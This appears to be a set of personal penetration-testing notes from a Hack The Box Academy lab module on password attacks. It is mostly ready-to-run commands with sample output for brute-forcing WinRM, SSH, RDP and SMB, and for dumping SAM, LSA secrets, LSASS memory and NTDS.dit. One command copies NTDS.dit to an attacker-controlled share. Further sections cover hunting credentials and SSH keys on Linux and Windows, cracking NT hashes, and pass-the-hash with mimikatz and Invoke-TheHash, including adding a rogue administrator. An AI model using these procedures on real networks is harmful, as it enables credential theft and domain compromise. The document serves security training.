# Password Attacks
## Network Services
* crackmapexex (mssql, smb, ssh, winrm)
<pre>
<b># WinRM</b>
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password

<b># SSH</b>
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197

<b># RDP</b>
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password

<b># SMB</b>
hydra -L user.list -P password.list smb://10.129.42.197
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
</pre>
## Attacking SAM
### Info
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:  
|Registry Hive|Description|
|------------|------------|
|hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
We can create backups of these hives using the reg.exe utility.  
### Dumping registry hives and copy them to attack machine
Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:  
<pre>
# Using reg.exe save to Copy Registry Hives
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
</pre>
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host (e.g. through SMB or HTTP).  
### Dumping hashes offline
<pre>
<b># secretsdump.py</b>
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
</pre>
### Cracking hashes with hashcat
**Copy just the nt hashes to the hashes.txt file!!!!**
<pre>
$ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
</pre>
### Remote Dumping & LSA Secrets Considerations
With access to credentials with **local admin privileges**, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.  
<pre>
# Dumping LSA Secrets Remotely
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached

# Dumping SAM Remotely
$ mrFiSHER@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
</pre>
## Attacking LSASS
### Dumping LSASS Process Memory
* **Task Manager**
  * task manager / right click on lsass process / Create dump file
  * the files will be saved here: C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP
* **Rundll32.exe & Comsvcs.dll Method**
  * Finding PID of lsass
    * C:\Windows\system32> tasklist /svc | find /I "lsass.exe"
    * (or with powershell PS> Get-Process lsass)
  * Creating lsass.dmp using PowerShell
    * PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
### Using Pypykatz to Extract Credentials
https://github.com/skelsec/pypykatz
<pre>
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
</pre>
### Cracking the NT Hash with Hashcat
<pre>
mrFiSHER@htb[/htb]$ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
</pre>
## Attacking Active Directory & NTDS.dit
### Capturing NTDS.dit (manual technique)
* Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command.
* We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.
* It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.
* We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
* We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
<pre>
<b># Connecting to a DC with Evil-WinRM</b>
mrFiSHER@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

<b># Checking Local Group Membership</b>
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
...

<b># Checking User Account Privileges including Domain</b>
*Evil-WinRM* PS C:\> net user bwilliamson
User name                    bwilliamson
Full Name                    Ben Williamson
...
Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
...

### This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file. ###

<b># Creating Shadow Copy of C:</b>
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

<b># Copying NTDS.dit from the VSS</b>
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.

<b># Transferring NTDS.dit to Attack Host</b>
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy C:\NTDS\NTDS.dit \\10.10.10.2\test 

        1 file(s) copied.		
</pre>
### Capturing NTDS.dit using CrackMapExec
Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.  
<pre>
mrFiSHER@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
...
</pre>
### Cracking Hashes & Gaining Credentials
<pre>
mrFiSHER@htb[/htb]$ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
</pre>
### Pass-the-Hash (if we can not crack a hash)
<pre>
<b># Pass-the-Hash with Evil-WinRM Example</b>
mrFiSHER@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
</pre>
## Credential Hunting in Windows
* Lazagne
* cmd searches
  * e.g. C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
* tipical places where credentials can be found
  * Passwords in Group Policy in the SYSVOL share
  * Passwords in scripts in the SYSVOL share
  * Password in scripts on IT shares
  * Passwords in web.config files on dev machines and IT shares
  * unattend.xml
  * Passwords in the AD user or computer description fields
  * KeePass databases --> pull hash, crack and get loads of access.
  * Found on user systems and shares
  * Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
## Credential Hunting in Linux
<pre>
<b># Configuration Files</b>
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

<b># Credentials in Configuration Files</b>
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

<b># Databases</b>
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

<b># Notes</b>
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

<b># Scripts</b>
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

<b># Cron jobs</b>
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

<b># SSH keys</b>
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

<b># Bash history</b>
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

<b># Log files</b>
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

<b># Memory and cache</b>
https://github.com/huntergregal/mimipenguin
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 

<b># Lazagne</b>
...

<b># Firefox Stored Credentials</b>
# Detailed here: https://academy.hackthebox.com/module/147/section/1320
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
--> https://github.com/unode/firefox_decrypt
$ python3.9 firefox_decrypt.py
</pre>
## Pass the Hash (PtH)
* PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
* The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.
* Hashes can be obtained in several ways, including:
  * Dumping the local SAM database from a compromised host.
  * Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
  * Pulling the hashes from memory (lsass.exe).
### Pass the Hash with Mimikatz (Windows)
* Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.
* To use this module, we will need the following:
  * /user - The user name we want to impersonate.
  * /rc4 or /NTLM - NTLM hash of the user's password.
  * /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
  * /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
<pre>
<b># original cmd console</b>
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268

<b># new cmd console opens</b>
C:\Windows\System32\>
</pre>
### Pass the Hash with PowerShell Invoke-TheHash (Windows)
* https://github.com/Kevin-Robertson/Invoke-TheHash
* This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.
* Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.
* When using Invoke-TheHash, we have two options: SMB or WMI command execution.
* To use this tool, we need to specify the following parameters to execute commands in the target computer:
  * Target - Hostname or IP address of the target.
  * Username - Username to use for authentication.Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
  * Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
  * Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
<pre>
<b># Invoke-TheHash with SMB</b>
# The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
</pre>
